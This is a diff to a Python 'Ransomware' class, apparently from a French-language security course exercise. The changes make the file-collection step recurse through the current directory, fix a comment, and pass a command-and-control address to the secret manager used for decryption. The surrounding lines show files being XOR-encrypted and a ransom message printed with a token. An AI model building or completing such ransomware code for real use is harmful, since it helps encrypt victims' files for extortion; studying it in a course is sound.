@@ -54,10 +54,9 @@ class Ransomware:
 
     def get_files(self, filter:str)->list:
         # return all files matching the filter
-        path = Path("/")
-        matching_files = list(path.rglob(filter)) #récupère tous les fichiers correspondant au filtre
-        return [str(file) for file in matching_files] #retourne la liste des fichiers en string
-        
+        base_path = Path(".")
+        matching_files = [str(file.absolute()) for file in base_path.rglob(filter) if not file.is_symlink()]
+        return matching_files
 
     def encrypt(self):
         # main function for encrypting (see PDF)
@@ -73,7 +72,7 @@ class Ransomware:
         # Chiffrement des fichiers
         secret_manager.xorfiles(files)
 
-        # Annonce de de l'attaqueà la victime
+        # Annonce de de l'attaque à la victime
         hex_token = secret_manager.get_hex_token()
         print(ENCRYPT_MESSAGE.format(token=hex_token))
 
@@ -81,7 +80,7 @@ class Ransomware:
     def decrypt(self):
         # main function for decrypting (see PDF)
         #Chargement des éléments nécessaires au déchiffrement
-        secret_manager = SecretManager()
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
         secret_manager.load()
 
         #Déchiffrement des fichiers
